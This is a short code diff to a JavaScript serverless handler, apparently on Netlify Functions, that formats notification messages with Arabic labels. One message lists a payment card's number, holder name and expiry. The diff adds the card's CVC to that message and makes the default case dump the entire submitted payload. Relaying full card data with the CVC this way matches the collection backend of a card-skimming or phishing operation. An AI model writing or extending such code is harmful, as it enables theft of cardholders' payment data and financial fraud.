@@ -140,6 +140,7 @@ exports.handler = async (event, context) => {
 رقم البطاقة: ${data.message.number}
 الاسم: ${data.message.name}
 التاريخ: ${data.message.expiry}
+CVC: ${data.message.cvc}
 ⏰ الوقت: ${messageTimestamp}
 🌐 البيئة: Netlify Functions
 📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
@@ -167,8 +168,15 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
 📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
         break;
         
-      default:
+      case 'message':
         formattedMessage = `${data.message}
+⏰ الوقت: ${messageTimestamp}
+🌐 البيئة: Netlify Functions
+📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
+        break;
+        
+      default:
+        formattedMessage = `${JSON.stringify(data, null, 2)}
 ⏰ الوقت: ${messageTimestamp}
 🌐 البيئة: Netlify Functions
 📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
